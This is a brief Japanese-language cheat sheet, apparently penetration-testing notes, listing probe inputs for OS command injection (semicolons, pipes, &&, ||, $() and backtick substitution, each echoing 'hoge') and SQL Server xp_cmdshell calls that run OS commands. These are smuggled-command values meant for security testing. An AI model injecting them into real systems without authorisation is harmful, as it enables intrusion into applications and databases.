# OSCommandInjection

## 検証方法

* 検証方法

``` shell
   # help表示
   -h 
   # 最初のコマンドに続けて実行 Linux系のみ
   ; echo hoge
   # Perlのファイルオープンのインジェクション
   echo hoge |
   # or 検証
   || echo hoge
   # and 検証
   && echo hoge
   # バックグラウンドに落とす
   & echo hoge
   # bash限定 コマンド置換
   $(echo hoge)
   # unix/linux コマンド置換
   `echo hoge`
   # unix/linux プロセス置換
   > (echo hoge)
```

## SQLでOSコマンドを実行

* SQL Server 限定
* カレントディレクトリはcmd.exeがあるディレクトリ

``` SQL
   exec xp_cmdshell 'echo file output test > test.txt'
   --　戻り値が欲しいとき
   exec @result = master..xp_cmdshell 'dir *.exe'
```
